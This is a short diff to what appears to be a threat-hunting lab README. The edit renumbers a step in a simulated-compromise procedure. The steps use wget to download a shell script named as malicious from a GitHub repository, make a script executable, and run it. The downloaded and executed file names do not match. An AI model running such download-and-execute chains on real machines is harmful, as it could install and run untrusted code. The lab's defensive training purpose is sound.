@@ -4,4 +4,4 @@
 
 1. Downloaded a malicious file to the machine. `wget https://raw.githubusercontent.com/Goodka7/Threat-Hunting-Malicious-Execution-/refs/heads/main/resources/MaliciousFile.sh`
 2. Make the file executable. `chmod +x malicious_script.sh`
-2. Execute the malicious file, simulating a compromise. `./malicious_script.sh`
+3. Execute the malicious file, simulating a compromise. `./malicious_script.sh`
